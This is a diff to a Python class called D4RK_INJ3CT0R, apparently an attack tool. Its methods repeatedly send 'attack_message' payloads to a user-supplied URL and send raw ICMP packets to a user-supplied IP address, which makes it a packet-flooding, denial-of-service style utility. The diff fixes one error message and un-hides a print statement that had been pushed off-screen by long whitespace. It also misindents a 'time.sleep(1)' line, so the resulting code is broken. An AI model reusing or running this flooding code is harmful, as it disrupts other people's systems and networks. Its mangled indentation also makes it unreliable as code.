@@ -61,7 +61,7 @@ class D4RK_INJ3CT0R:
                 print(colored(f"Sent {attack_message} to {target_url}", "green"))
                 time.sleep(1)
             except Exception as e:
-                print(colored(f"Failed to send {attack_message} to {target_ip}: {e}", "red"))
+                print(colored(f"Failed to send {attack_message} to {target_url}: {e}", "red"))
 
     def l3_attack(self):
         target_ip = input(colored("Enter the target IP address: ", "green"))
@@ -77,11 +77,12 @@ class D4RK_INJ3CT0R:
                 sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, icmp)
                 sock.sendto(attack_message.encode(), (target_ip, 0))
                 print(colored(f"Sent {attack_message} to {target_ip}", "green"))
-                time.sleep(1)
+              time.sleep(1)
             except Exception as e:
                 print(colored(f"Failed to send {attack_message} to {target_ip}: {e}", "red"))
 
-    def clear_attacks(self):                                                                                                                                                                                                                          print(colored("Stopping all attacks...", "yellow"))
+    def clear_attacks(self):
+        print(colored("Stopping all attacks...", "yellow"))
         for attack in self.attacks.values():
             attack.join()
         self.attacks.clear()
